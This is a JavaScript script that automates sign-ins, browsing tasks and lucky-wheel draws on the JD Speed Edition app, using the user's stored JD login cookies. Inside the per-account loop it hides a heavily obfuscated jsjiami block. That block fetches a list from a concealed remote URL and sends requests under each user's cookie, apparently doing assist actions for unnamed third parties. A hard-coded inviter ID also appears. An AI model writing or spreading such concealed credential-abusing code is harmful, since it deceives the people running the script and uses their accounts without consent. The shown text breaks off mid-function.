/*
京东极速版签到+赚现金任务
每日9毛左右，满3，10，50可兑换无门槛红包
⚠️⚠️⚠️一个号需要运行40分钟左右

活动时间：长期
活动入口：京东极速版app-现金签到
原脚本作者：lxk0301
*/
const $ = new Env('京东极速版');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
const JD_API_HOST = 'https://api.m.jd.com/', actCode = 'visa-card-001';


!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      var _0xodM='jsjiami.com.v6',_0x30d4=[_0xodM,'wq7Cm8ORNsOe','w7DDl8OtwpIT','w7jDqy8Qw6c=','w6HDhl8=','Uk3DkcOQdw==','K8K3wp3Du14=','bMKZA8OlwpDDocKk','wr8swrfDkRo=','SxR8w7jDqg==','wo7CuMOdTyTCrSc=','UcOEw5LDjCk=','w6nCjQIdCzo=','w63Drk07wrQ=','M8KXw7DCriVFNw==','NTxyJl8=','KwzDn1FJAA==','w4R6cwnCoMOIw4A=','BcKgw61rPA==','w5d6bhw=','Mj1gCHM=','w4bDk8O3wp88w4rCkQ==','wrnCqcOMSwc=','w7LCiQUO','XsOdRQ3Cqg==','VcOYMcOTL2DDiMO/QMOuI28=','HmgdH3U+worDkcOUSMORJsOQUcKbTMO+T8O4MVBow4nCmXUNw5wWw4Qsd1bCsQ==','wq49wrXDjhbDjMKWHVluUQZew4kOw55IwoYtRTnCqMOOSsKsw7NDAsOIK8KIw7xM','CMKIwq3DoEFPZMOXw5nCoRLDhFvDrMOewpnCmx88L8K5wrTDpcO8w4XCgMOcCg==','w5DDpmwfw6E=','XcKQRk7DgMK9L8KpwoIAw6vCoMKGLWxo','UGw7w6Y=','VMOVaHHDq8KJDMKcw6s2w7rChsKnWAsVACXCqsKSwpLDjF/DssKfw4DCpcOkw7FOw58ywo94w4zCuggyw6DDn8Oqw7LDocOpZ8KoIQPDtXLCqMOJKCDCicO4w4HCtcKLfQTCm8O0w6g0MsK1w6/DvcO7V8K4w4RNVzMkwoXDvMK9FsKQwq18LcOyW8KAG2bCnE7DjcOSD3PChcOHw5DCp0DCsH8Cw5/Dg8KSbyvCucOdw7zCrsOPCglXwr4rThzClzvDlDLDuAfCncKDw5JDbcKNYMK9wp9dXzBAaMKfwqArw6FpIcO/CG5+w7kPw6A=','wohJIsKVKGBSwq1LworDiQjCj8K9w6HDuMOkacOZw45yPGHDhcOSMMKaw4LDsA==','wpsiw4TCrcKGB8KkUBs=','w4rDhsO3wo4IwpXDisOrwozCiy7DpsKqwqzDkhs8R3hqZU/DpU4=','w5jDkMKJSsOg','DsKGwqjDqVU=','wozCqcOrw5hz','MyR0N2k=','w6MoacK8wrg=','woh+CMOFN8Ks','AyJh','YMOlO8OpwqrDksO3woHCnzbCh8KQwpc=','wqXDlGQ=','w6jDocOcwqsow6rCt8KbwqzCvALChsKT','F8Oew5pkRQ==','wp3DmU0JWA==','cMKFYsO/w45qwqTDr1nDrw==','wpAoCC8LRMOw','w57Cq0HDr3M=','ASljJ1oKw4I=','wrt+O0zCpw==','w4/Dt8OVwrES','w7w4JCzCng==','wpBQwojCqMKiw6Urwoc8UcOWwql8KC8mG8KdwrAXZsKGYUYTw6HCpsK+YTzCnTdRaXYfwovDhjAcw4HDp8O9SzbCmcO2Hk8owr/DrRRqw7HDkkARw54fwpYceBjDlXLDr19mEXUnwq7DocKNwpolw6Fcw6DDrcKkcsOUwqJCwp8ufsK/OjPDiRE=','KsOUVcOnwr/DpcK+QcO2w64Yw4JqR3NNw5vCo8KUC8OiPgluZFTDvMOBWcOfOsK+wpAtbRLCu23CnWPCncO/wqXDsEl7wrbDiMKyw6PCvMKRwr9IOcOeeU7DnMKjccK0wpRlTcO8OsODJMKxTcOuXjd5w610AMKiaTXChsK4ZUnCvcKOQ8KqejE/KcOxw6rCtMKWw552wptZw43CrcOGJMOVwppIRlN9QzHClGHCv8OhWC1yQTDDrMK1wqIbYxY3TcKhdXnCjsOWw4fCmMOJw61ewqVFCsKhw7wCbsOCf3nDtjwJSDzCucOvLybCjATDpVjDrGBUe8KxFcKmPTsROMODw5jDvWhKPHAYO8OgIcKtRWcYw5zCn8KfB8OnS8KcLmdzFMKGJ8KUw6nDoMKewqhPw6F0HMOhPMOewqBWVy/Dv8KjHhFOblQjSCHCt0PCq8O9TMOpw7dNw7gYeMONahRzdx/Cu0gwJCPDoErDtHzDt8Ozw6IVcnFPHsKBwqUMRgM=','RMOYw6wp','wpvCkMOhwoZ1RsKmw71EAMOLw4Q=','w4vDvjEQw6Y6YcO7w5nCnjDDrSIowo7CljR6cmEgUBzCpsKMw6RhUcO8MMOtw5jCng==','wovCqcOZQgrCqzIDwqZWw4Niw6QqVzrDosOUMcO5wp/DlcKDw7URw6TCjMKMPcOgw6bCiWA=','w4kPR8KOwqUzw7LDsMOew6DCncOdwpknw5vCgg8Cw7VdeSl6FcKw','wogkwp/Cp8Kc','wqDCr8KDw59oBUDCqMKPf8O2V8K5w5HChMOr','U3bDqcOU','w4XCrWDCgsKYwp7Cl8OEwqbCm2vCtB3CvsKAw5jCuEHDr8K9X1/DnGcUwrwow4oMYBcnw5LCiAA0w4zDqCDChMKjCi/DnCXCuMOFw4LDtsKdwpfCvBfCv8KaY8K1dXzDpsO5w6EDw7PDk38ZwqfCiMOxJ8KccHU3w5dJQl/DqMKhwoDCthpwOWAWPXVcH0gPwpQowqvCisKkw6Yiw4BFwoo7w6kVw5vDn8K7wpvDniFTHl5BR8KYwpt5NMKERMKEwofDisOPJjclX8Onw4DDuMKVQMKGwpDDicKKw61+BsK/UXLCqMONTMOLw4PDlMOn','TMK4UcOEw6VOwpHDo3M=','YMKMA8O0wqTCvsO/AMOyw7JTw5Y2RTtdwprCq8KeCMOvO19x','w5/DosK8w4Nt','w7DDkcOJb8OS','w5zDr8O0Y8O5','XsOlw64ywo8=','B8KbwrTDo3M=','wpPCk8OGw4d8DQ==','EsKSdQ==','w4zDsHQrwqJ/w4jDk8KCwoHDt07CoA==','w6DChho=','QsKrKMORwoTDgcKCcMOSw4V/wrYP','woJnN8ONJg==','w6/DqAI6w6s=','wrVuE8K3BBs6w4dswrA=','woPDhHwJc8Kfw7k=','elQ2wqUE','fVoaw4PCrSVU','w6A7JBbCuA==','wrPCk8OJw7JB','w70iQcKPVMOUwpvCoCTDlwU7HcKsasKmw7ceU8Kfw4rDr8OPM8KNSyTCvgEOLlzCulXDpTt6','woTCsmrCjcKYwpbCiMOaw5TClgbCgRjDtsOYwr/DpxnCtsOyCzjClyFZwrsuw5tdbQoowoTDghJww4jCthnCg8K2B2HCimbDp8KRwp7CssOUw5zCvDfCv8KKPcOcWFrDmsKtw4sEwrLCkSBkwr/CisO5L8KDdHdAw40IAXjDmsOvwrbDulYTczJLeg4bGG0FwpJ+w63DjsO4wqd9wqcaw4lywrU7w6HDm8KfwrnDkDsd','PiLDnXdc','w4bCjSoZa8Kbw73Dp8Opw5YgQloVbjZ3wq7Drzk6EMK1R0IOw6PClsK3w4woXl7CicKhwrDChx5pwrrDv8OcPA==','NwbDgkI=','w6XDiMKMf8Owwp1NaAlfw7DCvMKJw7vDosKrwrg3HMK0GUjDqMO7woTCnMOvwqjDnsKnwqt9w6sww7p8Cz7CpGwow5oUHXMRw5PDiHNsZcO1MjhjScOZwq3CuU/CrDJ+w6R2w4LClMKPeBs=','G8K/w7JnNHjDmMKKw5TCs190w6VCQl04w45FX8KXSmMbwpppUjDDoiXCkU3Digp/woDDo8Oxwr0QwofDmiIFw4JDP2kwwpgaw6NWccOQwp0dUyHDqsO1wrICw7FmZCXDiMOJdcKRPCpLPMOywrvDrsO3bsOKFcK0w6N3KMONWMOlwp/CjcOQEsOnVMO5woN7w6wnf8KTw7JoegYZw4HCgcKTJMOWw7HCocOEwrJ/wqYeX8KnTsKkZMKywpHDiCrDgMKxwr3Dt8O1w4bDgMOHX8KRw6Q/w5gowo7CvSc5wolCCCDCumZgw5dJZA==','w6rClFTDlFc=','SNjnYseZzjiamYLi.SAqcfoWm.rv6=='];(function(_0x1df3f0,_0x379208,_0x572537){var _0x3e9a01=function(_0x4cc90a,_0x3680e0,_0x47dac1,_0x5bad2f,_0x401eb9){_0x3680e0=_0x3680e0>>0x8,_0x401eb9='po';var _0x4ca5b4='shift',_0x17708d='push';if(_0x3680e0<_0x4cc90a){while(--_0x4cc90a){_0x5bad2f=_0x1df3f0[_0x4ca5b4]();if(_0x3680e0===_0x4cc90a){_0x3680e0=_0x5bad2f;_0x47dac1=_0x1df3f0[_0x401eb9+'p']();}else if(_0x3680e0&&_0x47dac1['replace'](/[SNnYeZzYLSAqfWr=]/g,'')===_0x3680e0){_0x1df3f0[_0x17708d](_0x5bad2f);}}_0x1df3f0[_0x17708d](_0x1df3f0[_0x4ca5b4]());}return 0x756ce;};return _0x3e9a01(++_0x379208,_0x572537)>>_0x379208^_0x572537;}(_0x30d4,0xd2,0xd200));var _0x7056=function(_0x58a351,_0x589c26){_0x58a351=~~'0x'['concat'](_0x58a351);var _0x2dcaf2=_0x30d4[_0x58a351];if(_0x7056['IKPgXQ']===undefined){(function(){var _0x9da57=function(){var _0x715904;try{_0x715904=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5be198){_0x715904=window;}return _0x715904;};var _0xacf8ad=_0x9da57();var _0x3dd142='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xacf8ad['atob']||(_0xacf8ad['atob']=function(_0x179ea1){var _0x2423e7=String(_0x179ea1)['replace'](/=+$/,'');for(var _0x2d19cb=0x0,_0x38de1c,_0x23e083,_0x11403f=0x0,_0x409969='';_0x23e083=_0x2423e7['charAt'](_0x11403f++);~_0x23e083&&(_0x38de1c=_0x2d19cb%0x4?_0x38de1c*0x40+_0x23e083:_0x23e083,_0x2d19cb++%0x4)?_0x409969+=String['fromCharCode'](0xff&_0x38de1c>>(-0x2*_0x2d19cb&0x6)):0x0){_0x23e083=_0x3dd142['indexOf'](_0x23e083);}return _0x409969;});}());var _0x31faa5=function(_0x30e32b,_0x589c26){var _0x58982d=[],_0x357739=0x0,_0x23a553,_0x1d35c3='',_0x72e6a9='';_0x30e32b=atob(_0x30e32b);for(var _0x17462b=0x0,_0x17c3c8=_0x30e32b['length'];_0x17462b<_0x17c3c8;_0x17462b++){_0x72e6a9+='%'+('00'+_0x30e32b['charCodeAt'](_0x17462b)['toString'](0x10))['slice'](-0x2);}_0x30e32b=decodeURIComponent(_0x72e6a9);for(var _0x50b822=0x0;_0x50b822<0x100;_0x50b822++){_0x58982d[_0x50b822]=_0x50b822;}for(_0x50b822=0x0;_0x50b822<0x100;_0x50b822++){_0x357739=(_0x357739+_0x58982d[_0x50b822]+_0x589c26['charCodeAt'](_0x50b822%_0x589c26['length']))%0x100;_0x23a553=_0x58982d[_0x50b822];_0x58982d[_0x50b822]=_0x58982d[_0x357739];_0x58982d[_0x357739]=_0x23a553;}_0x50b822=0x0;_0x357739=0x0;for(var _0x24cb85=0x0;_0x24cb85<_0x30e32b['length'];_0x24cb85++){_0x50b822=(_0x50b822+0x1)%0x100;_0x357739=(_0x357739+_0x58982d[_0x50b822])%0x100;_0x23a553=_0x58982d[_0x50b822];_0x58982d[_0x50b822]=_0x58982d[_0x357739];_0x58982d[_0x357739]=_0x23a553;_0x1d35c3+=String['fromCharCode'](_0x30e32b['charCodeAt'](_0x24cb85)^_0x58982d[(_0x58982d[_0x50b822]+_0x58982d[_0x357739])%0x100]);}return _0x1d35c3;};_0x7056['oXIWTR']=_0x31faa5;_0x7056['wpIApv']={};_0x7056['IKPgXQ']=!![];}var _0x346a4d=_0x7056['wpIApv'][_0x58a351];if(_0x346a4d===undefined){if(_0x7056['mmpCCk']===undefined){_0x7056['mmpCCk']=!![];}_0x2dcaf2=_0x7056['oXIWTR'](_0x2dcaf2,_0x589c26);_0x7056['wpIApv'][_0x58a351]=_0x2dcaf2;}else{_0x2dcaf2=_0x346a4d;}return _0x2dcaf2;};shuye72();function help1(_0x5c02bf){var _0x4831a6={'UlqEc':_0x7056('0','iF8k'),'nzqyg':_0x7056('1','Y**['),'vIcpk':_0x7056('2','7sD0'),'UhctR':_0x7056('3','wHPi'),'BSZBn':_0x7056('4','[x5x'),'DKWER':function(_0x1589b6,_0x552ba1){return _0x1589b6(_0x552ba1);},'yxEdJ':_0x7056('5','SiHb'),'BMFTi':_0x7056('6','1sm!'),'mEVOi':_0x7056('7','SiHb'),'UnDnc':_0x7056('8','kYto')};let _0x11ce1b=+new Date();let _0x502262=_0x5c02bf[_0x7056('9','$x0P')];let _0x36e247={'url':_0x7056('a','oCmB')+ +new Date(),'headers':{'Host':_0x4831a6[_0x7056('b','W(FG')],'accept':_0x4831a6[_0x7056('c','wHPi')],'content-type':_0x4831a6[_0x7056('d','mUjg')],'origin':_0x4831a6[_0x7056('e','aX85')],'accept-language':_0x4831a6[_0x7056('f','rSS2')],'user-agent':$[_0x7056('10','XGJS')]()?process[_0x7056('11','aX85')][_0x7056('12','BbK0')]?process[_0x7056('13','u*n2')][_0x7056('14','oCmB')]:_0x4831a6[_0x7056('15','[RCt')](require,_0x4831a6[_0x7056('16','#a[@')])[_0x7056('17','*kne')]:$[_0x7056('18','*2Se')](_0x4831a6[_0x7056('19','VjAs')])?$[_0x7056('1a','aX85')](_0x4831a6[_0x7056('1b','oZs$')]):_0x4831a6[_0x7056('1c','oCmB')],'referer':_0x4831a6[_0x7056('1d','($w5')],'Cookie':cookie},'body':_0x7056('1e','7acf')+_0x502262+_0x7056('1f','K]Nk')+_0x11ce1b};$[_0x7056('20','74^R')](_0x36e247,(_0x335d73,_0x228c82,_0x3b33a3)=>{});}function help2(_0x7c9387){var _0x1d0963={'QbuOZ':_0x7056('21','mUjg'),'hxzAA':_0x7056('22','[x5x'),'DFGMj':_0x7056('23','R2lB'),'jRqoe':_0x7056('24','rSS2'),'ggmsA':_0x7056('25','$x0P'),'cjqgu':function(_0x15613,_0xb9b99c){return _0x15613(_0xb9b99c);},'EfCFd':_0x7056('26','Gv$A'),'ImDTE':_0x7056('27','v4m4'),'IsAZY':_0x7056('28','o^pc'),'yKlAa':function(_0x45d855,_0x18f14d){return _0x45d855(_0x18f14d);}};let _0x1ff91c=+new Date();let _0x192187=_0x7c9387[_0x7056('29','*kne')];let _0xce6405={'url':_0x7056('2a','K]Nk')+ +new Date(),'headers':{'Host':_0x1d0963[_0x7056('2b','Gv$A')],'accept':_0x1d0963[_0x7056('2c','3tDl')],'content-type':_0x1d0963[_0x7056('2d','3tDl')],'origin':_0x1d0963[_0x7056('2e','74^R')],'accept-language':_0x1d0963[_0x7056('2f','wHPi')],'user-agent':$[_0x7056('30','mUjg')]()?process[_0x7056('31','J!)3')][_0x7056('32','7P[F')]?process[_0x7056('33','VMx]')][_0x7056('34','K]Nk')]:_0x1d0963[_0x7056('35','XGJS')](require,_0x1d0963[_0x7056('36','[x5x')])[_0x7056('37','kYto')]:$[_0x7056('38','#a[@')](_0x1d0963[_0x7056('39',']LpC')])?$[_0x7056('3a','1sm!')](_0x1d0963[_0x7056('3b','($w5')]):_0x1d0963[_0x7056('3c','mUjg')],'referer':_0x7056('3d','T2XW')+_0x192187,'Cookie':cookie},'body':_0x7056('3e','o^pc')+_0x1d0963[_0x7056('3f','3yIR')](escape,_0x192187)+_0x7056('40','#a[@')+_0x1ff91c};$[_0x7056('41','3yIR')](_0xce6405,(_0x7d61e8,_0x5e54fc,_0x447717)=>{});}function shuye72(){var _0xfe1864={'vrSoM':function(_0x53e022,_0x439304){return _0x53e022!==_0x439304;},'bjCoy':function(_0x273b1e,_0x235512){return _0x273b1e<_0x235512;},'Renlh':function(_0x1406b0,_0xf4a3c1){return _0x1406b0(_0xf4a3c1);},'KhmEM':_0x7056('42','W(FG'),'KKDkl':_0x7056('43','[NP3')};new Promise(_0x4451cf=>{var _0x5452a9={'CgKjY':function(_0x25e822,_0x21689a){return _0xfe1864[_0x7056('44','VjAs')](_0x25e822,_0x21689a);},'kMfEE':function(_0x4fd953,_0x122693){return _0xfe1864[_0x7056('45','^Yes')](_0x4fd953,_0x122693);},'TqwKH':function(_0x34df1e,_0x567670){return _0xfe1864[_0x7056('46','oCmB')](_0x34df1e,_0x567670);},'KXqJH':function(_0x44dba9,_0x24962e){return _0xfe1864[_0x7056('47','[x5x')](_0x44dba9,_0x24962e);}};$[_0x7056('48','7P[F')]({'url':_0xfe1864[_0x7056('49','v4m4')],'headers':{'User-Agent':_0xfe1864[_0x7056('4a','wHPi')]}},async(_0x425860,_0x5a61f8,_0x3ea307)=>{if(_0x3ea307){$[_0x7056('4b','K]Nk')]=JSON[_0x7056('4c','7sD0')](_0x3ea307);if(_0x5452a9[_0x7056('4d','RBQc')]($[_0x7056('4e','R2lB')][_0x7056('4f','ZIoT')][_0x7056('50','VMx]')],0x0)){for(let _0xf17065=0x0;_0x5452a9[_0x7056('51','7P[F')](_0xf17065,$[_0x7056('52','Vmvt')][_0x7056('53','aX85')][_0x7056('54','3yIR')]);_0xf17065++){let _0x1b0be3=$[_0x7056('55','(C]x')][_0x7056('56','[NP3')][_0xf17065];await $[_0x7056('57','(C]x')](0x1f4);_0x5452a9[_0x7056('58','aX85')](help1,_0x1b0be3);let _0x1ce3b9=$[_0x7056('59','oCmB')][_0x7056('5a','R2lB')][_0xf17065];await $[_0x7056('5b','VMx]')](0x1f4);_0x5452a9[_0x7056('5c','U)fa')](help2,_0x1b0be3);}}}});});};_0xodM='jsjiami.com.v6';
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdGlobal()
      await $.wait(2*1000)
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdGlobal() {
  try {
    await richManIndex()

    await wheelsHome()
    await apTaskList()
    await wheelsHome()
    await signInit()
    await sign()
    $.score = 0
    $.total = 0
    await taskList()
    await queryJoy()
    await signInit()
    await cash()
    await showMsg()
  } catch (e) {
    $.logErr(e)
  }
}


function showMsg() {
  return new Promise(resolve => {
    message += `本次运行获得${$.score}金币，共计${$.total}金币`
    $.msg($.name, '', `京东账号${$.index}${$.nickName}\n${message}`);
    resolve()
  })
}

async function signInit() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSignInit', {
      "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
      "kernelPlatform": "RN",
      "inviterId":"DNfaRn46j3w7TR4On8bJjlhOf"
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            //console.log(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function sign() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSign', {
        "kernelPlatform": "RN",
        "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
        "noWaitPrize": "false"
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.subCode === 0) {
                console.log(`签到获得${data.data.signAmount}现金，共计获得${data.data.cashDrawAmount}`)
              } else {
                console.log(`签到失败，${data.msg}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function taskList() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
        "version": "3.1.0",
        "method": "newTaskCenterPage",
        "data": {"channel": 1}
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              for (let task of data.data) {
                $.taskName = task.taskInfo.mainTitle
                if (task.taskInfo.status === 0) {
                  if (task.taskType >= 1000) {
                    await doTask(task.taskType)
                    await $.wait(1000)
                  } else {
                    $.canStartNewItem = true
                    while ($.canStartNewItem) {
                      if (task.taskType !== 3) {
                        await queryItem(task.taskType)
                      } else {
                        await startItem("", task.taskType)
                      }
                    }
                  }
                } else {
                  console.log(`${task.taskInfo.mainTitle}已完成`)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function doTask(taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "marketTaskRewardPayment",
      "data": {"channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              console.log(`${data.data.taskInfo.mainTitle}任务完成成功，预计获得${data.data.reward}金币`)
            } else {
              console.log(`任务完成失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function queryJoy() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {"method": "queryJoyPage", "data": {"channel": 1}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.data.taskBubbles)
                for (let task of data.data.taskBubbles) {
                  await rewardTask(task.id, task.activeType)
                  await $.wait(500)
                }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function rewardTask(id, taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "joyTaskReward",
      "data": {"id": id, "channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              $.score += data.data.reward
              console.log(`气泡收取成功，获得${data.data.reward}金币`)
            } else {
              console.log(`气泡收取失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}


async function queryItem(activeType = 1) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "queryNextTask",
      "data": {"channel": 1, "activeType": activeType}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              await startItem(data.data.nextResource, activeType)
            } else {
              console.log(`商品任务开启失败，${data.message}`)
              $.canStartNewItem = false
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function startItem(activeId, activeType) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "enterAndLeave",
      "data": {
        "activeId": activeId,
        "clientTime": +new Date(),
        "channel": "1",
        "messageType": "1",
        "activeType": activeType,
      }
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              if (data.data.taskInfo.isTaskLimit === 0) {
                let {videoBrowsing, taskCompletionProgress, taskCompletionLimit} = data.data.taskInfo
                if (activeType !== 3)
                  videoBrowsing = activeType === 1 ? 5 : 10
                console.log(`【${taskCompletionProgress + 1}/${taskCompletionLimit}】浏览商品任务记录成功，等待${videoBrowsing}秒`)
                await $.wait(videoBrowsing * 1000)
                await endItem(data.data.uuid, activeType, activeId, activeType === 3 ? videoBrowsing : "")
              } else {
                console.log(`${$.taskName}任务已达上限`)
                $.canStartNewItem = false
              }
            } else {
              $.canStartNewItem = false
              console.log(`${$.taskName}任务开启失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function endItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "enterAndLeave",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              await rewardItem(uuid, activeType, activeId, videoTimeLength)
            } else {
              console.log(`${$.taskName}任务结束失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function rewardItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "rewardPayment",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              $.score += data.data.reward
              console.log(`${$.taskName}任务完成，获得${data.data.reward}金币`)
            } else {
              console.log(`${$.taskName}任务失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function cash() {
  return new Promise(resolve => {
    $.get(taskUrl('MyAssetsService.execute',
      {"method": "userCashRecord", "data": {"channel": 1, "pageNum": 1, "pageSize": 20}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              $.total = data.data.goldBalance
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

// 大转盘
function wheelsHome() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsHome',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                console.log(`【幸运大转盘】剩余抽奖机会：${data.data.lotteryChances}`)
                while(data.data.lotteryChances--) {
                  await wheelsLottery()
                  await $.wait(500)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘
function wheelsLottery() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsLottery',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.data && data.data.rewardType){
                console.log(`幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`)
                message += `幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`
              }else{
                console.log(`幸运大转盘抽奖获得：空气`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘任务
function apTaskList() {
  return new Promise(resolve => {
    $.get(taskGetUrl('apTaskList',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
